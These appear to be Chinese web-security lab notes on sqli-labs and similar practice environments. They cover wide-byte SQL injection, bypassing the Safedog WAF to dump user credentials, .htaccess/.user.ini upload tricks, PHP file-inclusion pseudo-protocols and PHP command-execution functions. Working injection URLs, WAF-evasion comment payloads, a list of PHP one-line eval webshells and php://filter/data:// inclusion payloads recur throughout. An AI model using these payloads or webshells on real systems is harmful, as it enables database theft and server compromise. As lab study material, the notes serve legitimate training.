<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607153300026.png" alt="image-20230607153300026" style="zoom: 33%;" />

## 宽字节注入

### 前置知识

#### 输入实体化

为了保证网站的安全性，通常会对用户的输入来做安全过滤，并将敏感字符进行实体化。

实体化：在`' " \ NULL`这些字符串前面加`\`

```php
<?php
$id = "1' and 1=1#";
$payload = addslashes($id);
$sql = "select * from users where id = '{$payload}'";
var_dump($sql);

# 输出
string(45) "select * from users where id = '1\' and 1=1#'"
```

数据库执行

```sql
# 可以发现：由于实体化，使用反斜杆进行转移，使得单引号变成了字符串，没有起效。导致SQL攻击失效
mysql> select * from users where id = '1\' and 1=2#';
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set, 1 warning (0.00 sec)
```

### 注入原理

==首先要保证目标的数据库使用的是GBK编码==

将payload改为：`1%df' and 1=1#`，

```php
<?php
$id = "1%df' and 1=1#";
$id = addslashes($id);
$sql = "select * from users where id = '{$id}'";
var_dump($sql);

# 输出：
string(48) "select * from users where id = '1%df\' and 1=1#'"
```

此时，由于GBK的编码方式，会将`%df\`组成一个新字符，这个字符是一个汉字，导致`\`失效，`'`恢复功能：`1ߜ' and 1=1#`

### 注入流程-Less-32

#### 寻找回显位

```
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,2,3%23 
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607201323254.png" alt="image-20230607201323254" style="zoom:33%;" />

#### 爆库

```
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,group_concat(schema_name),3 from information_schema.schemata%23 
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607201634066.png" alt="image-20230607201634066" style="zoom: 33%;" />

#### 爆表

```
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23 
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607201838412.png" alt="image-20230607201838412" style="zoom:33%;" />

#### 爆库

注意：`table_name='users'`这里的两个单引号无法逃逸，使用宽字节注入会造成语法错误，所以这里直接使用16进制

```
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x7573657273%23 
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607203144060.png" alt="image-20230607203144060" style="zoom:33%;" />

#### 拖库

```
# 查询所有用户名
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,group_concat(username),3 from users%23 
# 查询所有密码
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,group_concat(password),3 from users%23 
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607203307391.png" alt="image-20230607203307391" style="zoom:33%;" />

## SQL注入-过狗

### 常见的WAF绕过语句

#### 注释

```
/*xxx*/：在SQL里，多行解释是 /* */
/*!xxx*/:MySQL扩展了解释的功能，如果后面加了!，那么注释符号将被执行
/*!50001xxxx*/：这里的50001表示如果数据库版本是：5.00.01以上版本，该语句才会被执行
# 最新版安全狗万能注释符绕过
/*//--**/
/*/!--**/
/*/-*!!*/
```

#### 替换

##### and、or替换

```
1、&&和||
2、使用异或或截断：?id=1^1^0		?id=1^0^0
3、使用{``operation}：and{`test` 1=2}		and{`test` 1=2}
4、直接使用真、假：&& true		&& false
```

##### order by替换

```
group by
```

##### union select

```
union all select
```

##### information_schema.tales

```
sys.schema_table_statistics_with_buffer
sys.schema_auto_increment_columns
mysql.innodb_table_stats
```

### 安全狗4.0.266-SQL注入过程

这里一开始使用教程给的注释符号无法绕过，开始做模糊测试

#### 模糊测试-注释符

==在做模糊测试之前需要先将安全狗的CC攻击检测关闭==

思路是往`/**/`里面填东西

![image-20230608172018747](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608172018747.png)

![image-20230608172030624](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608172030624.png)

可以发现有许多符号可以绕过安全狗

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608172756462.png" alt="image-20230608172756462" style="zoom:50%;" />

给出几个可成功绕过的符号

```
/*//--**/ 
/*//---**/
/*//--/*/
/*//--/*/
```

#### order by查询

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=1' order /*//--/*/ by 3%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608173502813.png" alt="image-20230608173502813" style="zoom:50%;" />

#### UNION 查询

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,2,3%23v
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608173625895.png" alt="image-20230608173625895" style="zoom:50%;" />

#### 查看当前数据库

这里可以看到被安全狗防御了，问题就出在`dataase()`身上

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,database(),3%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608173708699.png" alt="image-20230608173708699" style="zoom:33%;" />

将注释符往database()里面放进去，成功绕过！

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,database(/*//--/*/),3%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608173834474.png" alt="image-20230608173834474" style="zoom:50%;" />

#### 爆库

在做爆库的过程中，发现`from`后面不能再加东西

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,group_concat(schema_name),3 from abc%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608174030426.png" alt="image-20230608174030426" style="zoom:50%;" />

尝试加上注释符，成功绕过！

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,group_concat(schema_name),3 from /*//--/*/abc%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608174126231.png" alt="image-20230608174126231" style="zoom:50%;" />

再次发现安全狗对`information_schema`了防御

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608174319537.png" alt="image-20230608174319537" style="zoom:50%;" />

尝试往`information_schema`中间加入注释符，成功绕过

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,group_concat(schema_name),3 from /*//--/*/information_/*//--/*/schema%23
```



<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608174403861.png" alt="image-20230608174403861" style="zoom:50%;" />

这里在网上看到这条payload，大概意思应该是这样

```sql
# 使用 /*!*/ 使得 # 的注释功能生效，注释掉后面的abc字符串，再使用换行来逃过 # 的注释，1 为要查询的信息，最后使用*/来闭合注释
mysql> select /*!#abc
    -> 1*/;
+---+
| 1 |
+---+
| 1 |
+---+
1 row in set (0.00 sec)

/*!--+/*%0ainformation_schema.schemata*/ 完整解释
/*!--+  使得 --+ 注释功能生效
/*xxx*/ 混淆WAF
%0a		回车逃过 --+ 的注释
*/		最后使用 */ 来闭合前面的 /*
```



```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union/*/!*!**/select%201,2,group_concat(schema_name)from/*!--+/*%0ainformation_schema.schemata*/--+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608180406635.png" alt="image-20230608180406635" style="zoom:50%;" />

#### 爆表

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union/*/!*!**/select%201,2,group_concat(table_name)from/*!--+/*%0ainformation_schema.tables where table_schema=database()*/--+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608180519244.png" alt="image-20230608180519244" style="zoom:50%;" />

#### 爆字段

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union/*/!*!**/select%201,2,group_concat(column_name)from/*!--+/*%0ainformation_schema.columns where table_schema=database() and table_name='users'*/--+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608180612648.png" alt="image-20230608180612648" style="zoom:50%;" />

#### 拖库

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union/*/!*!**/select%201,2,group_concat(username,':',password)from/*!--+/*%0ausers*/--+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608180726467.png" alt="image-20230608180726467" style="zoom:50%;" />

### 安全狗4.0.266-无列名注入

安全狗对于输入有非常严格的过滤，一旦输入的字符串中包含了`information_schema`就会被拦截，所以这里学习一个`join 无列名报错注入`，==适用于无法使用`information_schema`但是知道数据表名的情况==

#### 注入原理

通过使用一张表做两次内联查询的方式来使得列名冲突的方式来使得数据库报错，并爆出冲突的列名

```sql
mysql> select * from (select * from users as a join users as b)c;
ERROR 1060 (42S21): Duplicate column name 'id'
mysql> select * from (select * from users as a join users as b using(id))c;
ERROR 1060 (42S21): Duplicate column name 'username'
mysql> select * from (select * from users as a join users as b using(id, username))c;
ERROR 1060 (42S21): Duplicate column name 'password'
mysql> select * from (select * from users as a join users as b using(id, username, password))c;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
+----+----------+------------+
13 rows in set (0.00 sec)
```

#### 注入流程

##### 爆字段

这里发现`union`和`from`后面都不能加东西，所以尝试加入注释符号绕过，成功得到第一个字段名

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*/!--**/ select * from (select * from /*/!--**/ users a join users b)c --+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608195202683.png" alt="image-20230608195202683" style="zoom:50%;" />

使用 using 来排除字段，得到第二个字段名

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*/!--**/ select * from (select * from /*/!--**/ users a join users b using(id))c --+
```

![image-20230608195241484](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608195241484.png)

同样方法，得到第三个字段名

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*/!--**/ select * from (select * from /*/!--**/ users a join users b using(id, username))c --+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608195324303.png" alt="image-20230608195324303" style="zoom:50%;" />

回显正常，没有报错信息，列名爆破完成

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*/!--**/ select * from (select * from /*/!--**/ users a join users b using(id, username, password))c --+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608195432015.png" alt="image-20230608195432015" style="zoom:50%;" />

##### 拖库

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*/!--**/ select 1,2,group_concat(username,':',password) from /*/!--**/ users --+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608195615749.png" alt="image-20230608195615749" style="zoom:50%;" />

# 文件上传

## `.htaccess`文件介绍

`htaccess`文件是Apache服务器中的一个配置文件，他复制相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能

其中`.htaccess`文件内容

`SetHandler application/x-httpd-php`

==设置当前目录所有文件都使用`PHP`解析==，那么无论上传任何文件，只要文件内容符合`PHP`语言代码规范，就会被当作`PHP文件执行`。不符合则报错

### `.httpd.conf`

要使得`.htaccess`文件生效，则必须对`Apache`配置文件做以下配置

```bash
<Directory />
    AllowOverride all			# 启动 .htaccess 文件并允许用户对该文件进行修改（默认为none）
    Require all denied			# 禁止用户访问Apache运行目录
</Directory>
```

## `.user.ini`

在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。

这个文件是php.ini的补充文件，==当访问PHP网页的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项==
其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。

此文件与`.htaccess`文件类似，能指定具体的文件当作PHP文件来执行，但是一定要记住：==只作用于当前目录下==

```
auto_prepend_file 表示加载第一个PHP代码之前执行指示（包含的）PHP文件
auto_append_file 表示加载第一个PHP代码之后执行指示（包含的）PHP文件
简单来说
 
auto_prepend_file = <filename>         //包含在文件头
auto_append_file = <filename>          //包含在文件尾
例如：auto_append_file、auto_prepend_file
指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。
```

## `.htaccess`和`.user.ini`文件总结

### 作用范围

`.htaccess`文件用于指定**当前目录**下的某个文件或全部文件当作PHP文件来执行，属于`Apache`的文件

`.user.ini`文件用于指定**当前目录**下的某个文件当作PHP文件来执行

### 激活

`.htaccess`文件在正确上传之后，Apache在加载某个文件之前会自动读取，只要保证`getshell`文件于`.htaccess`在同一目录就行

`.user.ini`文件在正确上传`getshell`文件之后必须先访问**同一目录**下的`PHP`文件，原因：`PHP`解释器在执行的时候会先检查当前目录是否存在`.user.ini`文件，存在则加载进配置文件`php.ini`，并执行配置文件的内容；后续使用蚁剑连接的URL则使用当前访问的PHP文件的URL来连接





## `$_Files` 变量

`$_Files`变量记录了文件的相信信息，包括文件类型，文件名，上传路径等

```bash
array(5) {
  ["name"]=>
  string(14) "金砖2023.txt"
  ["type"]=>
  string(10) "text/plain"
  ["tmp_name"]=>
  string(22) "C:\Windows\php80F6.tmp"
  ["error"]=>
  int(0)
  ["size"]=>
  int(247)
}
```

值得一提的是：`type`对应的是HTML中的`Content-Type`字段。大多数时候，后台程序员都是根据`type`的类型来判断文件类型是否合法。但是可以通过使用BP来修改`Content-Type`字段，以达到绕过的目的

现在将`.htaccess`文件上传，并将文件类型修改为图片文件。最后文件上传到服务器的文件名依然是：`.htaccrss`

==即：修改`Content-Type`不会影响文件的类型==

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230706134229696.png" alt="image-20230706134229696" style="zoom:50%;" />

## PHP一句话木马大全

```php
<?=eval($_POST['cmd']);?>
<?eval($_POST['cmd']);?>
<?php eval($_POST['cmd']);?>
<script language="php">eval($_POST['cmd']);</script>
```

# 文件包含

## 文件包含漏洞理论

### 文件包含漏洞产生原因

由于程序员的代码不规范或为了保证代码的灵活性，错误使用PHP文件包含函数，如：`include | require`函数，包含了一个**用户可控变量**，从而造成了文件包含漏洞

### 触发文件包含的PHP函数

```
Include：
Include_once：
require
require_once
highlight_file、show_source、readfile、file_get_contents、fopen、file
```

include 和 require 函数的区别：

`include` 和 `require` 都可以用来在 PHP 文件中插入另一个 PHP 文件的内容。它们的区别在于，当文件不存在时，`include` 会产生一个警告，但脚本会继续执行；而 `require` 会产生一个致命错误，并停止脚本执行

`include_once`和`require_once`若遇到重复包含的代码块，都只会包含一次

**补充：**`include`函数还可以包含图片文件或者其他文件，只要里面带有着`PHP`代码就会被执行

#### 文件包含漏洞分类

+ 本地文件包含

+ 远程文件包含

  ```
  allow_url_fopen：为ON时，能读取远程文件，例如file_get_contents()就能读远程文件
  Allow_url_include：为ON时，就可使用include和require等方式包含远程文件
  ```

#### 文件包含漏洞利用方式

##### `PHP`伪协议

![image-20230707161448462](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707161448462.png)



```
php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用
data:// 同样类似与php://input，可以让用户来控制输入流
php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行
phar://xxx.png/shell.php 解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。
```

### 文件包含漏洞防御

+ PHP 中使用 open_basedir 配置限制访问在指定的区域
+ 过滤.（点）/（反斜杠）\（反斜杠）
+ 禁止服务器远程文件包含
+ 尽量不要使用动态包含，可以在需要包含的页面固定写好

## 文件包绕过方式

### `%00`截断

此方法要求`PHP`版本必须小于`5.3.4`，后面版本已修复

#### 源码

```php
<?php
include($_GET['library'].".php");
?>
```

#### 原理

在路径最后加入`%00`，传入`PHP`之后变成下面这样，相当于在最后添加了一个空格，让`PHP`读不到后面拼接出来的字符串

```php
<?php
include("flag.txt .php");
?>
```

补充，有时也可以使用`./`

### 路径长度绕过

## windows系统

### 1.路径长度绕过

==Windows使用256个`.`或`./`来绕过。Linux需要4096个==

**wj.php**

```javascript
<?php
$a=@$_GET['123'];
include($a.'.html');
?>
```

复制

如果限制了文件类型，比如这里只能包含html后缀的文件，那么就可以使用此方法

#### 简介

操作系统存在最大路径长度的限制。`windows系统，文件名最长256个字符`，可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，导致扩展名被中途截断

在文件后面加`.` 如： `info.php...........................................................................................................................................................................................................................................................................................html`

`.`超过256个就行，后面多出来的`...........................................html`不会被识别到

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/1200.png)



## `PHP`伪协议

跟着这张图照着打就好

![image-20230707161448462](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707161448462.png)

`file://`：后面跟绝对路径，用于直接**读取文件**

`php://filter`：以`base64`的方式**读取文件**

`php://input`：接受POST数据，可以使用POST方法来**写入恶意代码并执行**

`zip://`：需要先上传一个带有`PHP`代码的`PHP`压缩文件（压缩文件不检验后缀名，只要是一个压缩文件就可以），然后通过访问这个压缩包里面指定的`PHP`文件以达到**执行PHP代码**的目的

### `php://filter`

注意：`read`是可选参数，在特点情况下，不带`read`参数的payload可以绕过WAF

![image-20230902155148007](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902155148007.png)

#### `php://filter`格式

```
php://filter/<filtername>/resource=<filename>
<filtername>：过滤器
<filename>：文件名
```

**注意：**过滤器是可选的，即我们可以不带过滤器的形式读取文件：`php://filter/resource=flag.php`

#### `php://filter`过滤器详解

* `convert.base64-encode 和 convert.base64-decode`

  使用这两个过滤器等同于分别用 `base64_encode()` 或 `base64_decode()` 函数处理所有的流数据。

  ```php
  # 将数据流以base64编码
  php://filter/convert.base64-encode/resource=flag.php
  # 将数据流以base64解码
  php://filter/convert.base64-decode/resource=flag.php
  ```

+ `convert.quoted-printable-encode 和 convert.quoted-printable-decode`

  使用此过滤器的 decode 版本等同于用 `quoted_printable_decode()`函数处理所有的流数据。

  ==`quoted_printable`是一种编码格式==

  ```
  php://filter/convert.quoted-printable-encode/resource=flag.php
  ```

+ `convert.iconv.*`

  在激活 `iconv` 的前提下可以使用 `convert.iconv.*` 压缩过滤器， 等同于用` iconv()`处理所有的流数据。 该过滤器不支持参数，但可使用输入/输出的编码名称，组成过滤器名称，比如 `convert.iconv.<input-encoding>.<output-encoding>` 或 `convert.iconv.<input-encoding>/<output-encoding>` （两种写法的语义都相同）

  `icon()`函数解析：将字符串从一个字符编码转换到另一个字符编码

  **常见的编码转换格式**

  ```
  UTF-8 和 UTF-16
  UTF-8 和 ISO-8859-1
  UTF-8 和 Windows-1252
  UTF-8 和 GBK
  UTF-8 和 Big5
  ```

  **支持的编码格式**

  ![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/5a822481c9734b658c703ce0a782d502.png)![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/ee8f18d48b08440398466df437e38eae.png)

  ![img](https://img-blog.csdnimg.cn/ee8f18d48b08440398466df437e38eae.png)

```php
# 将flag.php文件从utf-8格式转换为utf-16编码
php://filter/convert.iconv.utf-8.utf-16/resource=flag.php
# 将flag。php文件从utf-8格式转换为ASCII编码
```





直接使用`php://filter`来读取flag

```
payload：?file=php://filter/read=convert.base64-encode/resource=flag.php
```

![image-20230707221254364](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707221254364.png)

![image-20230707221324095](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707221324095.png)

### `php://input`

使用`php://input`配合POST方法做数据提交

![image-20230707221623621](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707221623621.png)

### `zip://`

说明：

1. `zip`访问的压缩文件不校验后缀名，只要是压缩文件就行
2. `zip`必须使用**绝对路径**来访问压缩文件
3. `zip`在路径后面使用`%23具体文件名`来访问指定文件



先上传一个压缩文件

![image-20230707224105309](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707224105309.png)

使用`zip`伪协议进行访问

![image-20230707224406577](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707224406577.png)

```
payload：?file=zip://E:\phpstudy\phpstudy\phpstudy_pro\WWW\lfi-labs-master\php\uploads\9dce5388f44ed37f145b3737f360f7c0.zip%23phpinfo.php
```

### `data://`

这个协议与`file`协议差不多，只不过比`file`更多的花样而已，具体可以看图

```
payload：?file=data://text/plain,<?php+phpinfo();?> 
```

![image-20230707225819389](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707225819389.png)



# PHP命令执行

## 0x01. 实验环境搭建

#### docker搭建

```bash
# 搜索镜像
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# docker search mcc0624  
NAME                 DESCRIPTION      STARS     OFFICIAL   AUTOMATED
mcc0624/ser          用户php反序列化漏洞学习    2                    
mcc0624/cmd                           0                    
mcc0624/flask_ssti                    0                    
mcc0624/ssrf         目前还未完成，请各位不要下载   0                    
mcc0624/ssrf_mysql                    0                    
mcc0624/php_apache                    0  

# 下载镜像
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# docker pull mcc0624/cmd

# 启动环境
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# docker run -p 18022:22 -p 18080:80 -p 18081:81 -p 18082:82 -p 18085:85 -i -t mcc0624/cmd:latest bash -c '/etc/rc.local; /bin/bash'
```

## 0x02. 命令执行函数介绍

### `system()`函数

执行指定命令并返回结果，默认有回显

#### 格式：

```
system(string $command, [int $return_var = ?])
```

- `command`：要执行的操作系统命令，可以是一个简单的命令或命令组合。
- `return_var`：可选参数，用于存储命令的返回状态。如果提供了该参数，命令的返回状态将被存储在该变量中。

#### 演示：

```php
<?php
$cmd = 'dir';
$res = system($cmd);

# 输出
E:\phpstudy\phpstudy\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe D:\PHP\PHP命令执行\system函数.php
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of  :\PHP\PHP命令执行

2023/06/09  17:17    <DIR>          .
2023/06/09  17:15    <DIR>          ..
2023/06/09  17:17    <DIR>          .idea
2023/06/09  17:17                58 system函数.php
               1 File(s)             58 bytes
               3 Dir(s)  177,981,693,952 bytes free

Process finished with exit code 0
```

### `exec()`函数

执行指定命令，将输出保存到一个指定的数组。**默认只输出最后一行结果，默认有回显**

#### 格式：

```php
exec(command, [str $output], [rint $eturn_var]);
```

- `command`：要执行的操作系统命令，可以是一个简单的命令或命令组合。
- `output`：用于存储命令的输出的数组。命令的每一行输出将作为数组的一个元素。
- `return_var`：可选参数，用于存储命令的返回状态。如果提供了该参数，命令的返回状态将被存储在该变量中。

#### 演示：

```php
# 默认只输出最后一个结果
<?php
$comm = 'dir';

$res = exec($comm);
echo $res;

# 输出
E:\phpstudy\phpstudy\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe D:\PHP\PHP命令执行\system函数.php
               3 Dir(s)  177,981,693,952 bytes free
Process finished with exit code 0
```

```php
# 将返回的所有结果都存储到 $output arr()
<?php
$comm = 'dir';

$res = exec($comm, $output);
print_r($output);

# 输出
E:\phpstudy\phpstudy\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe D:\PHP\PHP命令执行\system函数.php
Array
(
    [0] =>  Volume in drive D is 新加卷
    [1] =>  Volume Serial Number is 40FB-5D65
    [2] => 
    [3] =>  Directory of D:\PHP\PHP命令执行
    [4] => 
    [5] => 2023/06/09  17:26    <DIR>          .
    [6] => 2023/06/09  17:15    <DIR>          ..
    [7] => 2023/06/09  17:25    <DIR>          .idea
    [8] => 2023/06/09  17:26                72 system函数.php
    [9] =>                1 File(s)             72 bytes
    [10] =>                3 Dir(s)  177,981,693,952 bytes free
)
```

### `passthru()`函数

功能与`system()`类似，默认有回显

#### 格式：

```
passthru(command, return_var);
```

- `command`：要执行的操作系统命令，可以是一个简单的命令或命令组合。
- `return_var`：可选参数，用于存储命令的返回状态。如果提供了该参数，命令的返回状态将被存储在该变量中。

#### 演示：

```php
<?php
$comm = 'dir';
passthru($comm);

# 输出
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of D:\PHP\PHP命令执行

2023/06/09  17:32    <DIR>          .
2023/06/09  17:15    <DIR>          ..
2023/06/09  17:28    <DIR>          .idea
2023/06/09  17:32                39 system函数.php
               1 File(s)             39 bytes
               3 Dir(s)  177,981,693,952 bytes free
```

### `shell_exec()`函数

功能与`system()`类似，默认**无回显**

#### 格式：

```
shell_exec(command);
```

`command`：要执行的操作系统命令，可以是一个简单的命令或命令组合。

#### 演示：

```php
<?php
$comm = 'dir';
echo shell_exec($comm);

# 输出
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of D:\PHP\PHP命令执行

2023/06/09  17:41    <DIR>          .
2023/06/09  17:15    <DIR>          ..
2023/06/09  17:28    <DIR>          .idea
2023/06/09  17:41                46 system函数.php
               1 File(s)             46 bytes
               3 Dir(s)  177,981,689,856 bytes free
```

### PHP反引号

反引号内的代码会直接被PHP当作系统命令来执行，**默认无回显**，但是，**如果是使用短标签包裹，那么就会有回显**

#### 格式：

```
$output = `command`;
```

#### 演示：

```php
<?php
echo `dir`;

# 输出
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of D:\PHP\PHP命令执行

2023/06/09  17:43    <DIR>          .
2023/06/09  17:15    <DIR>          ..
2023/06/09  17:42    <DIR>          .idea
2023/06/09  17:43                34 system函数.php
               1 File(s)             34 bytes
               3 Dir(s)  177,981,689,856 bytes free
```

### `popopen()`函数

在 PHP 中，`popen()` 函数用于执行一个外部命令，并返回一个指向该命令输出流的文件指针。通过该文件指针，您可以读取外部命令的输出。默认无回显

#### 格式：

```php
$handle = popen('command', 'mode');
```

#### 演示：

```php
<?php
$comm = 'dir';
$res = popen($comm, 'r');
echo fread($res, 4096);

--------------------
while ($s = fgets($output)){
    echo $s;
}

# 输出
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of D:\PHP\PHP命令执行

2023/06/09  17:50    <DIR>          .
2023/06/09  17:15    <DIR>          ..
2023/06/09  17:50    <DIR>          .idea
2023/06/09  17:50                73 system函数.php
               1 File(s)             73 bytes
               3 Dir(s)  177,981,689,856 bytes free
```

### `proc_open()`函数

在 PHP 中，`proc_open()` 函数用于执行一个外部命令，并提供更高级的控制和灵活性，与 `popen()` 函数相比，`proc_open()` 函数提供了更多选项来管理进程的输入、输出和错误流。默认**无回显**

#### 格式：

```
resource proc_open(string $command, array $descriptorspec, array &$pipes, string|null $cwd = null, array|null $env = null, array|null $other_options = null)
```

- `command`：要执行的外部命令。

- ```
  descriptorspec
  ```

  ：一个包含输入、输出和错误流的规范数组。规范数组的格式如下：

  - `0`：标准输入流（输入到命令的数据）。
  - `1`：标准输出流（命令的输出结果）。
  - `2`：标准错误流（命令的错误输出）。
  - 其他索引：可以自定义的文件描述符。
  - 每个索引的值可以是：
    - `["pipe", "r"]`：创建一个可写入的管道。
    - `["pipe", "w"]`：创建一个可读取的管道。
    - `["file", "path/to/file", "mode"]`：以指定的文件路径和模式打开一个文件。

- `pipes`：一个保存命令输入、输出和错误流的文件指针的数组。

- `cwd`：设置命令的当前工作目录（可选）。

- `env`：设置命令执行时的环境变量（可选）。

- `other_options`：其他选项（可选）。

#### 演示：

```php
<?php
$comm = 'dir'; // 要执行的命令，这里是使用dir命令列出当前目录的内容
$arr = array(
    array("pipe", "r"), // 标准输入流，这里使用管道打开可写入的输入流
    array("pipe", "w"), // 标准输出流，这里使用管道打开可读取的输出流
    array("file", "error-output.txt", "a") // 标准错误流，这里将错误输出重定向到文件中
);

$fp = proc_open($comm, $arr, $pipes); // 执行命令并打开进程
echo stream_get_contents($pipes[1]); // 读取标准输出流的内容并输出到屏幕上
proc_close($fp); // 关闭进程

# 输出
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of D:\PHP\PHP命令执行
 
2023/06/09  17:59    <DIR>          .
2023/06/09  17:15    <DIR>           ..
2023/06/09  17:50    <DIR>          .idea 
2023/06/09  17:59                 0 error-output.txt
2023/06/09  17:59               231 system函数.php
               2 File(s)            231 bytes
               3 Dir(s)  177,981,689,856 bytes free
```

## 0x03. `LD_PRELOAD`绕过原理介绍

### 攻击原理

在某些程序的运行过程中，会调用`LD_PRELOAD`，此时我们可以通过注入一个恶意的`LD_PRELOAD`库文件，使得程序在执行的过程中顺带执行了恶意程序，达到攻击的目的

举个例子：比如在`PHP`中的`echo`是一个打印函数，如果我们重构这个`echo()`函数，在里面调用`system()、shell()`等危险函数，那么用户在调用`echo()`函数时就会顺带执行了恶意代码

### 程序的链接

